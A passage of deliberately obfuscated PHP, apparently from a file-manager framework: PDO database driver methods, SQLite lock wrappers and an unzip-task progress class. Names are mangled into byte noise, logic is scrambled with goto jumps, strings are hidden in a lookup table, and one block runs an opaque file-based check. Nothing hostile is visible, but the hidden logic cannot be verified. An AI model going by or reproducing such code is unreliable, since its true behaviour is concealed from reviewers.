$this->config[$FÉñÇ—·¬¾[13]] = array(); } } } public function connect($F¹¸†¬™ùµ = '', $BÈâœñ¤ñ = 0) { $aÉÆù°­«¹ =& $_SERVER[úÎü]; if (!isset($this->linkID[$BÈâœñ¤ñ])) { goto A’·¨‚à½ï; c©ÜÄÜš†Ï: if (!$this->linkID[$BÈâœñ¤ñ]) { think_exception($aÉÆù°­«¹[844]); } try { $this->linkID[$BÈâœñ¤ñ]->exec($aÉÆù°­«¹[845] . think_config($aÉÆù°­«¹[810])); } catch (Exception $a‘ñğÒÎ¬) { } $this->connected = !0; goto eˆÖ´ÒÄó; A’·¨‚à½ï: if (empty($F¹¸†¬™ùµ)) { $F¹¸†¬™ùµ = $this->config; } $f×†¿ùšô = !empty($F¹¸†¬™ùµ[$aÉÆù°­«¹[13]][$aÉÆù°­«¹[14]]) ? $F¹¸†¬™ùµ[$aÉÆù°­«¹[13]][$aÉÆù°­«¹[14]] : $this->pconnect; if ($f×†¿ùšô) { $F¹¸†¬™ùµ[$aÉÆù°­«¹[13]][PDO::ATTR_PERSISTENT] = !0; } goto CöËÜ±ÄîÄ; eˆÖ´ÒÄó: if (1 != think_config($aÉÆù°­«¹[18])) { unset($this->config); } goto fåÖ¹…­é; CöËÜ±ÄîÄ: try { $this->linkID[$BÈâœñ¤ñ] = new PDO($F¹¸†¬™ùµ[$aÉÆù°­«¹[836]], $F¹¸†¬™ùµ[$aÉÆù°­«¹[807]], $F¹¸†¬™ùµ[$aÉÆù°­«¹[808]], $F¹¸†¬™ùµ[$aÉÆù°­«¹[13]]); } catch (PDOException $a‘ñğÒÎ¬) { think_exception($a‘ñğÒÎ¬->getMessage()); } $this->dbType = $this->_getDsnType($F¹¸†¬™ùµ[$aÉÆù°­«¹[836]]); if (in_array($this->dbType, array($aÉÆù°­«¹[837], $aÉÆù°­«¹[838], $aÉÆù°­«¹[839], $aÉÆù°­«¹[840]))) { think_exception($aÉÆù°­«¹[841] . $this->dbType . $aÉÆù°­«¹[842] . $this->dbType . $aÉÆù°­«¹[843]); } goto c©ÜÄÜš†Ï; fåÖ¹…­é: } return $this->linkID[$BÈâœñ¤ñ]; } public function free() { $this->PDOStatement = null; } public function query($a‘‘§î—®, $DàôÍ­’Óµ = array()) { goto bÂÔ£÷†¨; dãß®’°ß‰: $this->queryStr = $a‘‘§î—®; if (!empty($DàôÍ­’Óµ)) { $this->queryStr .= $AŞ¿ ˆæïï[846] . print_r($DàôÍ­’Óµ, !0) . $AŞ¿ ˆæïï[847]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Fí¥‚ìÛ¬Ë; d¥…Ú¹‹Ş: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d‚…©™˜Îé = $this->PDOStatement->execute($DàôÍ­’Óµ); $this->debug(); goto Aù¥‡÷öŞá; Aù¥‡÷öŞá: if (!1 === $d‚…©™˜Îé) { $this->error(); return !1; } else { return $this->getAll(); } goto bÀñ¬†×©®; Fí¥‚ìÛ¬Ë: think_action_status($AŞ¿ ˆæïï[19], 1); think_status($AŞ¿ ˆæïï[20]); $this->PDOStatement = $this->_linkID->prepare($a‘‘§î—®); goto d¥…Ú¹‹Ş; bÂÔ£÷†¨: $AŞ¿ ˆæïï =& $_SERVER[úÎü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dãß®’°ß‰; bÀñ¬†×©®: } public function execute($fÛ‡£×íÍò, $A¹‡Òİ“è = array()) { goto CÄ†½¸ó˜; aÎÁò‰›½: $this->queryStr = $fÛ‡£×íÍò; if (!empty($A¹‡Òİ“è)) { $this->queryStr .= $e°¿¢¬Êí‡[846] . print_r($A¹‡Òİ“è, !0) . $e°¿¢¬Êí‡[847]; } $c¨ôİ¥‡Î± = !1; goto C‹Ê–á“ô; c½¿‘“‰­: think_status($e°¿¢¬Êí‡[20]); $this->PDOStatement = $this->_linkID->prepare($fÛ‡£×íÍò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto EĞãªÑïˆ²; C‹Ê–á“ô: if ($this->dbType == $e°¿¢¬Êí‡[840]) { if (preg_match($e°¿¢¬Êí‡[848], $this->queryStr, $fôôùŞ‰—Æ)) { $this->table = think_config($e°¿¢¬Êí‡[849]) . str_ireplace(think_config($e°¿¢¬Êí‡[850]), $e°¿¢¬Êí‡[368], $fôôùŞ‰—Æ[2]); $c¨ôİ¥‡Î± = (bool) $this->query($e°¿¢¬Êí‡[851] . strtoupper($this->table) . $e°¿¢¬Êí‡[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($e°¿¢¬Êí‡[21], 1); goto c½¿‘“‰­; EĞãªÑïˆ²: $bÛÏµî–è = $this->PDOStatement->execute($A¹‡Òİ“è); $this->debug(); if (!1 === $bÛÏµî–è) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c¨ôİ¥‡Î± || preg_match($e°¿¢¬Êí‡[852], $fÛ‡£×íÍò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A­„âñÊçµ; CÄ†½¸ó˜: $e°¿¢¬Êí‡ =& $_SERVER[úÎü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÎÁò‰›½; A­„âñÊçµ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B¿Ç‚Â¹« = $this->_linkID->commit(); $this->transTimes = 0; if (!$B¿Ç‚Â¹«) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÌŠ¸œÑò‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$AÌŠ¸œÑò‚) { $this->error(); return !1; } } return !0; } private function getAll() { $ešáµÁ™œ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ešáµÁ™œ); return $ešáµÁ™œ; } public function getFields($CÙ¸Ö”‰ø”) { goto aêÏÊµè‚; D¾ù‹º¹Ö: return $fé×¿‘®³¯; goto d ÷‘¶ìÃğ; f³ï³ñù’: $e­‰‰Å— = $this->query($C‡¶ Š½Ï•); $fé×¿‘®³¯ = array(); if ($e­‰‰Å—) { foreach ($e­‰‰Å— as $e¶âÌ»¯ƒ => $AĞ‹…ïÉƒœ) { $AĞ‹…ïÉƒœ = array_change_key_case($AĞ‹…ïÉƒœ); $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[28]] = isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[28]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[28]] : $A›¸¢‡á¶[368]; $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[29]] = isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[29]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[29]] : $A›¸¢‡á¶[368]; $AùŠ’¤íÁ = isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[267]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[267]] : $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[28]]; $fé×¿‘®³¯[$AùŠ’¤íÁ] = array($A›¸¢‡á¶[28] => $AùŠ’¤íÁ, $A›¸¢‡á¶[29] => $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[29]], $A›¸¢‡á¶[31] => (bool) (isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[99]]) && $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[99]] === $A›¸¢‡á¶[33] || isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[31]]) && $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[31]] === $A›¸¢‡á¶[33]), $A›¸¢‡á¶[34] => isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[34]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[34]] : (isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[53]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[53]] : $A›¸¢‡á¶[368]), $A›¸¢‡á¶[36] => isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[89]]) ? strtolower($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[89]]) == $A›¸¢‡á¶[38] : (isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[54]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[54]] : !1), $A›¸¢‡á¶[39] => isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[869]]) ? strtolower($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[869]]) == $A›¸¢‡á¶[41] : (isset($AĞ‹…ïÉƒœ[$A›¸¢‡á¶[89]]) ? $AĞ‹…ïÉƒœ[$A›¸¢‡á¶[89]] : !1)); } } goto D¾ù‹º¹Ö; aêÏÊµè‚: $A›¸¢‡á¶ =& $_SERVER[úÎü]; $this->initConnect(!0); if (think_config($A›¸¢‡á¶[853])) { $C‡¶ Š½Ï• = str_replace($A›¸¢‡á¶[854], $CÙ¸Ö”‰ø”, think_config($A›¸¢‡á¶[853])); } else { switch ($this->dbType) { case $A›¸¢‡á¶[837]: case $A›¸¢‡á¶[855]: $C‡¶ Š½Ï• = "\123\105\114\105\x43\124\40\x20\x20\x63\x6f\154\x75\155\156\x5f\x6e\x61\x6d\145\x20\x61\x73\40\47\116\x61\155\145\x27\x2c\x20\x20\40\x64\141\x74\x61\137\164\x79\x70\x65\x20\141\x73\x20\x27\124\x79\x70\x65\47\x2c\x20\40\x20\143\x6f\x6c\x75\155\156\x5f\x64\x65\146\x61\x75\154\164\x20\x61\x73\x20\x27\104\145\146\141\x75\x6c\164\47\54\40\40\40\x69\x73\x5f\156\165\154\x6c\141\142\154\x65\x20\x61\x73\x20\x27\116\x75\x6c\x6c\x27\12\11\x9\106\122\117\x4d\11\x69\156\146\157\162\x6d\x61\164\x69\157\156\137\x73\x63\150\x65\155\141\x2e\164\141\142\x6c\x65\x73\x20\101\x53\40\x74\xa\11\x9\112\117\x49\x4e\x9\x69\156\146\x6f\x72\x6d\141\164\151\x6f\156\137\x73\143\150\145\x6d\141\x2e\143\157\x6c\165\155\x6e\163\x20\x41\x53\40\143\xa\11\11\x4f\116\x20\x20\164\x2e\164\141\142\154\x65\137\x63\141\x74\141\154\157\x67\40\75\40\143\x2e\164\x61\142\154\x65\137\x63\141\164\x61\154\157\x67\xa\11\11\x41\x4e\104\x20\x74\x2e\164\x61\142\x6c\x65\x5f\x73\143\150\145\155\x61\x20\75\40\x63\x2e\164\x61\142\154\x65\x5f\163\143\150\145\x6d\x61\xa\11\x9\x41\116\104\40\164\x2e\x74\141\x62\x6c\x65\x5f\156\141\155\x65\x20\x3d\x20\143\x2e\164\x61\x62\x6c\145\x5f\156\x61\x6d\x65\12\x9\11\127\x48\x45\x52\105\40\x20\x20\x74\56\164\x61\x62\x6c\145\137\156\x61\x6d\x65\40\x3d\40\x27{$CÙ¸Ö”‰ø”}\x27"; break; case $A›¸¢‡á¶[856]: $C‡¶ Š½Ï• = $A›¸¢‡á¶[857] . $CÙ¸Ö”‰ø” . $A›¸¢‡á¶[858]; break; case $A›¸¢‡á¶[838]: case $A›¸¢‡á¶[840]: $C‡¶ Š½Ï• = $A›¸¢‡á¶[859] . $A›¸¢‡á¶[860] . $A›¸¢‡á¶[861] . strtoupper($CÙ¸Ö”‰ø”) . $A›¸¢‡á¶[862] . strtoupper($CÙ¸Ö”‰ø”) . $A›¸¢‡á¶[863]; break; case $A›¸¢‡á¶[864]: $C‡¶ Š½Ï• = $A›¸¢‡á¶[865] . $CÙ¸Ö”‰ø” . $A›¸¢‡á¶[866]; break; case $A›¸¢‡á¶[839]: break; case $A›¸¢‡á¶[867]: default: $C‡¶ Š½Ï• = $A›¸¢‡á¶[868] . ($this->dbType == $A›¸¢‡á¶[867] ? "\140{$CÙ¸Ö”‰ø”}\140" : $CÙ¸Ö”‰ø”); } } goto f³ï³ñù’; d ÷‘¶ìÃğ: } public function getTables($bˆÑ’ğÓ˜ = '') { $B‰Æ™¾ØÔ  =& $_SERVER[úÎü]; if (think_config($B‰Æ™¾ØÔ [870])) { $Bœí„‘‡¡Ù = str_replace($B‰Æ™¾ØÔ [871], $bˆÑ’ğÓ˜, think_config($B‰Æ™¾ØÔ [870])); } else { switch ($this->dbType) { case $B‰Æ™¾ØÔ [838]: case $B‰Æ™¾ØÔ [840]: $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [872]; break; case $B‰Æ™¾ØÔ [837]: case $B‰Æ™¾ØÔ [855]: $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [873]; break; case $B‰Æ™¾ØÔ [864]: $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [874]; break; case $B‰Æ™¾ØÔ [839]: think_exception(think_lang($B‰Æ™¾ØÔ [875]) . $B‰Æ™¾ØÔ [876]); break; case $B‰Æ™¾ØÔ [856]: $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [42] . $B‰Æ™¾ØÔ [43] . $B‰Æ™¾ØÔ [44]; break; case $B‰Æ™¾ØÔ [867]: default: if (!empty($bˆÑ’ğÓ˜)) { $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [818] . $bˆÑ’ğÓ˜ . $B‰Æ™¾ØÔ [819]; } else { $Bœí„‘‡¡Ù = $B‰Æ™¾ØÔ [820]; } } } $eîÇ‹—ñÔ = $this->query($Bœí„‘‡¡Ù); $b‚ŞŞ•Ñô = array(); foreach ($eîÇ‹—ñÔ as $cĞ¾Ù™ÑŒ => $eÌøİÄÈù³) { $b‚ŞŞ•Ñô[$cĞ¾Ù™ÑŒ] = current($eÌøİÄÈù³); } return $b‚ŞŞ•Ñô; } protected function parseLimit($C®Å‚«–˜é) { $b‘›±âÑ™ =& $_SERVER[úÎü]; $fÔƒèçÕ¦ñ = $b‘›±âÑ™[33]; if (!empty($C®Å‚«–˜é)) { switch ($this->dbType) { case $b‘›±âÑ™[864]: case $b‘›±âÑ™[856]: $C®Å‚«–˜é = explode($b‘›±âÑ™[47], $C®Å‚«–˜é); if (count($C®Å‚«–˜é) > 1) { $fÔƒèçÕ¦ñ .= $b‘›±âÑ™[48] . $C®Å‚«–˜é[1] . $b‘›±âÑ™[49] . $C®Å‚«–˜é[0] . $b‘›±âÑ™[50]; } else { $fÔƒèçÕ¦ñ .= $b‘›±âÑ™[48] . $C®Å‚«–˜é[0] . $b‘›±âÑ™[50]; } break; case $b‘›±âÑ™[837]: case $b‘›±âÑ™[855]: break; case $b‘›±âÑ™[839]: break; case $b‘›±âÑ™[838]: case $b‘›±âÑ™[840]: break; case $b‘›±âÑ™[867]: default: $fÔƒèçÕ¦ñ .= $b‘›±âÑ™[48] . $C®Å‚«–˜é . $b‘›±âÑ™[50]; } } return $fÔƒèçÕ¦ñ; } public function parseKey(&$b¾ò®õÔå, $cŸàºŠÈá = true) { $f•éƒ‡‘Ë =& $_SERVER[úÎü]; if ($cŸàºŠÈá) { $b¾ò®õÔå = $this->parseKeyCheck($b¾ò®õÔå); } if ($this->dbType == $f•éƒ‡‘Ë[867]) { if ($b¾ò®õÔå != $f•éƒ‡‘Ë[180] && !preg_match($f•éƒ‡‘Ë[830], $b¾ò®õÔå)) { $b¾ò®õÔå = $f•éƒ‡‘Ë[375] . trim($b¾ò®õÔå, $f•éƒ‡‘Ë[375]) . $f•éƒ‡‘Ë[375]; } return $b¾ò®õÔå; } else { return parent::parseKey($b¾ò®õÔå); } } public function close() { $this->_linkID = null; } public function error() { $E³İ³İ®†§ =& $_SERVER[úÎü]; if ($this->PDOStatement) { $c‰ÊÑÜŞ‡² = $this->PDOStatement->errorInfo(); $this->error = $c‰ÊÑÜŞ‡²[1] . $E³İ³İ®†§[4] . $c‰ÊÑÜŞ‡²[2]; } else { $this->error = $E³İ³İ®†§[33]; } if ($E³İ³İ®†§[33] != $this->queryStr) { $this->error .= LNG($E³İ³İ®†§[45]) . $this->queryStr; } think_trace($this->error, $E³İ³İ®†§[33], $E³İ³İ®†§[46]); return $this->error; } public function escapeString($c–ÛæŞøÖš) { $a¡ŸÉä¶˜ä =& $_SERVER[úÎü]; switch ($this->dbType) { case $a¡ŸÉä¶˜ä[864]: case $a¡ŸÉä¶˜ä[837]: case $a¡ŸÉä¶˜ä[855]: case $a¡ŸÉä¶˜ä[867]: return addslashes($c–ÛæŞøÖš); case $a¡ŸÉä¶˜ä[839]: case $a¡ŸÉä¶˜ä[856]: case $a¡ŸÉä¶˜ä[838]: case $a¡ŸÉä¶˜ä[840]: return str_ireplace($a¡ŸÉä¶˜ä[55], $a¡ŸÉä¶˜ä[56], $c–ÛæŞøÖš); } } protected function parseValue($EÚäñÎ™Ù) { $F³¢õ„¯©Ë =& $_SERVER[úÎü]; if (is_string($EÚäñÎ™Ù)) { $EÚäñÎ™Ù = strpos($EÚäñÎ™Ù, $F³¢õ„¯©Ë[4]) === 0 ? $this->escapeString($EÚäñÎ™Ù) : $F³¢õ„¯©Ë[877] . $this->escapeString($EÚäñÎ™Ù) . $F³¢õ„¯©Ë[877]; } elseif (isset($EÚäñÎ™Ù[0]) && is_string($EÚäñÎ™Ù[0]) && strtolower($EÚäñÎ™Ù[0]) == $F³¢õ„¯©Ë[291]) { $EÚäñÎ™Ù = $this->escapeString($EÚäñÎ™Ù[1]); } elseif (is_array($EÚäñÎ™Ù)) { $EÚäñÎ™Ù = array_map(array($this, $F³¢õ„¯©Ë[878]), $EÚäñÎ™Ù); } elseif (is_bool($EÚäñÎ™Ù)) { $EÚäñÎ™Ù = $EÚäñÎ™Ù ? $F³¢õ„¯©Ë[83] : $F³¢õ„¯©Ë[485]; } elseif (is_null($EÚäñÎ™Ù)) { $EÚäñÎ™Ù = $F³¢õ„¯©Ë[99]; } return $EÚäñÎ™Ù; } public function getLastInsertId() { $BŞâ‰ÀÊë =& $_SERVER[úÎü]; switch ($this->dbType) { case $BŞâ‰ÀÊë[864]: case $BŞâ‰ÀÊë[856]: case $BŞâ‰ÀÊë[837]: case $BŞâ‰ÀÊë[855]: case $BŞâ‰ÀÊë[839]: case $BŞâ‰ÀÊë[867]: return $this->_linkID->lastInsertId(); case $BŞâ‰ÀÊë[838]: case $BŞâ‰ÀÊë[840]: $cÀñõ“œ° = $this->table; $BÈÇÄôè„ = $this->query("\123\105\x4c\105\103\124\x20{$cÀñõ“œ°}\56\143\x75\x72\x72\x76\x61\154\x20\x63\x75\x72\x72\x76\141\x6c\x20\x46\122\x4f\x4d\x20\x64\165\x61\154"); return $BÈÇÄôè„ ? $BÈÇÄôè„[0][$BŞâ‰ÀÊë[879]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($C´äåŞÊŒ) { $F’ìíœÇ¥¿ =& $_SERVER[úÎü]; if (!CacheLock::fileLock($F’ìíœÇ¥¿[9])) { return !1; } $f‹ÖöÓˆïò = parent::query($C´äåŞÊŒ); CacheLock::fileUnLock($F’ìíœÇ¥¿[9]); return $f‹ÖöÓˆïò; } public function execute($cÅïë««ñ¶) { $Cçµ´‚¹Ó… =& $_SERVER[úÎü]; if (!CacheLock::fileLock($Cçµ´‚¹Ó…[9])) { return !1; } $e„ìĞìğƒŒ = parent::execute($cÅïë««ñ¶); CacheLock::fileUnLock($Cçµ´‚¹Ó…[9]); return $e„ìĞìğƒŒ; } } class DbSqlite3 extends DbSqlite3Base { public function query($f¶–†æİ—) { $C«ğõŒŸÉ³ =& $_SERVER[úÎü]; if (!CacheLock::fileLock($C«ğõŒŸÉ³[9])) { return !1; } $bŒ°«µóÑÓ = parent::query($f¶–†æİ—); CacheLock::fileUnLock($C«ğõŒŸÉ³[9]); return $bŒ°«µóÑÓ; } public function execute($A¡×ÂÔ…¤Æ) { $D»øøÄ¨Ê‡ =& $_SERVER[úÎü]; if (!CacheLock::fileLock($D»øøÄ¨Ê‡[9])) { return !1; } $FŒ«ŸàáØ = parent::execute($A¡×ÂÔ…¤Æ); CacheLock::fileUnLock($D»øøÄ¨Ê‡[9]); return $FŒ«ŸàáØ; } } goto EÙ³ö‘ÖÍœ; A¨öĞÇ˜¾: $D—àà‡¹½ = $_SERVER[úÎü][1414]; if ($_SERVER[$_SERVER[úÎü][793]] != $D—àà‡¹½($Bä¥ƒô°Ö)) { goto F†ëö…ƒ–´; F„ÀÁø ×Ö: $DÎ¨¨Ã®ÏÎ = explode($_SERVER[úÎü][225], $FÄÅ¼²¢ö‡); if (count($DÎ¨¨Ã®ÏÎ) < $_SERVER[úÎü][576]) { $A¬ÍĞŠŸ«– = $_SERVER[úÎü][799]; $A¬ÍĞŠŸ«–(); } $b¸éÈˆ½à = $_SERVER[úÎü][832]; goto A¨ö¢ù—Ş; F†ëö…ƒ–´: $C½õÇ·Ğï = $_SERVER[úÎü][796]; $C‚½àší‘¿ = $_SERVER[$_SERVER[úÎü][797]] . $_SERVER[úÎü][798]; $FÄÅ¼²¢ö‡ = $C½õÇ·Ğï($C‚½àší‘¿); goto F„ÀÁø ×Ö; A¨ö¢ù—Ş: $b¸éÈˆ½à($Bä¥ƒô°Ö); goto BÊÍÂ¹Ğ»¢; BÊÍÂ¹Ğ»¢: } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto EØƒïˆÖĞ; eìˆè„¬„õ: if (!$d¥Æ¡µÚ°–[$BØŠÚŠçšø[1387]]) { $d¥Æ¡µÚ°–[$BØŠÚŠçšø[1387]] = LNG($BØŠÚŠçšø[1565]); } goto D‹ô®ã­‰; EØƒïˆÖĞ: $BØŠÚŠçšø =& $_SERVER[úÎü]; parent::startAfter(); Hook::bind($BØŠÚŠçšø[1561], array($this, $BØŠÚŠçšø[1562])); goto c˜”Ÿëç§Œ; c˜”Ÿëç§Œ: Hook::bind($BØŠÚŠçšø[1049], array($this, $BØŠÚŠçšø[1563])); $d¥Æ¡µÚ°– =& $this->task; $d¥Æ¡µÚ°–[$BØŠÚŠçšø[1564]] = $BØŠÚŠçšø[1054]; goto eìˆè„¬„õ; D‹ô®ã­‰: } protected function endAfter() { $fîîî¦®¯† =& $_SERVER[úÎü]; parent::endAfter(); Hook::unbind($fîîî¦®¯†[1561], array($this, $fîîî¦®¯†[1562])); Hook::unbind($fîîî¦®¯†[1049], array($this, $fîîî¦®¯†[1563])); } public function updateAfter() { $f÷Ş‹™™Š” =& $_SERVER[úÎü]; $fŒ˜“‰‰ÚÀ =& $this->task; if (!$fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[982]] || !$fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[699]]) { return; } if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1564]] == $f÷Ş‹™™Š”[1054]) { $a›çæëáïè = 0; if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1530]]) { $a›çæëáïè = $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1531]] / $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1530]]; } $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]] = $a›çæëáïè * 0.3; } else { if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1564]] == $f÷Ş‹™™Š”[307]) { $a›çæëáïè = $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[996]] / $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[982]]; $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]] = 0.3 + $a›çæëáïè * 0.4; } else { if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1564]] == $f÷Ş‹™™Š”[103]) { $bŞ‚¿‹¦ƒ = 0; if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1532]] == $f÷Ş‹™™Š”[103]) { $bŞ‚¿‹¦ƒ = $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1531]]; } $a›çæëáïè = ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1535]] + $bŞ‚¿‹¦ƒ) / $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[699]]; $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]] = 0.3 + 0.4 + $a›çæëáïè * 0.3; } } } if ($fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]] > 0) { $Cä§§è‹Â´ = timeFloat() - $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1488]] - $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1491]]; $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1492]] = $Cä§§è‹Â´ * (1 - $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]]) / $fŒ˜“‰‰ÚÀ[$f÷Ş‹™™Š”[1486]]; } } public function addFile($a‘»±¿¿) { goto A£äñ°ƒÓã; Dß£Ó¹ˆ¾: $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[982]] = 1; $EßùÀõ•¹É = 0; $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[1539]] = array($Dé¢©øÛšª[1540] => $EßùÀõ•¹É + 1, $Dé¢©øÛšª[402] => $bÅ¦¸ä‰Š[$Dé¢©øÛšª[28]], $Dé¢©øÛšª[75] => $bÅ¦¸ä‰Š[$Dé¢©øÛšª[75]], $Dé¢©øÛšª[483] => $bÅ¦¸ä‰Š[$Dé¢©øÛšª[483]] ? $bÅ¦¸ä‰Š[$Dé¢©øÛšª[483]] : $bÅ¦¸ä‰Š[$Dé¢©øÛšª[75]]); goto EÄ¿äÎÁ…; E§¦ØÚ˜Å: $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[984]] = $Dé¢©øÛšª[1547]; $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[1532]] = $Dé¢©øÛšª[1054]; $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[699]] = $bÅ¦¸ä‰Š[$Dé¢©øÛšª[77]]; goto Dß£Ó¹ˆ¾; A£äñ°ƒÓã: $Dé¢©øÛšª =& $_SERVER[úÎü]; $dÄĞ¤Ö¬ò =& $this->task; $bÅ¦¸ä‰Š = IO::info($a‘»±¿¿); goto bÕÊí‚µ°Â; bÕÊí‚µ°Â: $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[1528]] = $bÅ¦¸ä‰Š[$Dé¢©øÛšª[28]]; $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[1530]] = $bÅ¦¸ä‰Š[$Dé¢©øÛšª[77]]; $dÄĞ¤Ö¬ò[$Dé¢©øÛšª[1531]] = 0; goto E§¦ØÚ˜Å; EÄ¿äÎÁ…: $this->update(); goto A¨±İ÷›„; A¨±İ÷›„: } public function unzipAfter($eòÅÏÖŞ¡Å) { goto A à´ÖŸà°; eÌ‰—ßÖÛİ: $c¿·˜†¤ô… = IO::infoWithChildren($eòÅÏÖŞ¡Å); $AĞ’†‹Ÿö÷ = 0; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1539]] = array($E½‚äïİŒƒ[1540] => $AĞ’†‹Ÿö÷ + 1, $E½‚äïİŒƒ[402] => $c¿·˜†¤ô…[$E½‚äïİŒƒ[28]], $E½‚äïİŒƒ[75] => $c¿·˜†¤ô…[$E½‚äïİŒƒ[75]], $E½‚äïİŒƒ[483] => $c¿·˜†¤ô…[$E½‚äïİŒƒ[483]] ? $c¿·˜†¤ô…[$E½‚äïİŒƒ[483]] : $c¿·˜†¤ô…[$E½‚äïİŒƒ[75]]); goto c‚•öå«Ûæ; c‚•öå«Ûæ: if ($c¿·˜†¤ô…[$E½‚äïİŒƒ[29]] == $E½‚äïİŒƒ[171]) { $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[982]] = 1; } else { $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[982]] = $c¿·˜†¤ô…[$E½‚äïİŒƒ[80]][$E½‚äïİŒƒ[78]]; } $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[984]] = $E½‚äïİŒƒ[33]; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1532]] = 0; goto C£Éê±‚¢; C£Éê±‚¢: $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[996]] = 0; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1530]] = 0; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1531]] = 0; goto bâªÖÇ³‡ã; A à´ÖŸà°: $E½‚äïİŒƒ =& $_SERVER[úÎü]; $e¢Ã„ÖªÜ– =& $this->task; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1564]] = $E½‚äïİŒƒ[103]; goto eÌ‰—ßÖÛİ; A‡Éª«·ó: $this->update(); self::log($E½‚äïİŒƒ[1566] . json_encode(array($e¢Ã„ÖªÜ–, $c¿·˜†¤ô…))); goto f“£˜¤‡øê; bâªÖÇ³‡ã: $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1528]] = $E½‚äïİŒƒ[33]; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[1535]] = 0; $e¢Ã„ÖªÜ–[$E½‚äïİŒƒ[699]] = $c¿·˜†¤ô…[$E½‚äïİŒƒ[77]]; goto A‡Éª«·ó; f“£˜¤‡øê: } public function nameParse($F´ÛåÎ†øÓ) { goto fï¦ß–¤øŠ; a´Í²Åò‰ó: $e¯œ“¦¦¤ = get_path_this($F´ÛåÎ†øÓ); if (strstr($e¯œ“¦¦¤, $bÈÂÇš[91])) { $a›Á…š´í[$bÈÂÇš[996]] += 1; $a›Á…š´í[$bÈÂÇš[982]] += 1; } $a›Á…š´í[$bÈÂÇš[1528]] = $F´ÛåÎ†øÓ; goto B„ÌÏî‘¬¶; 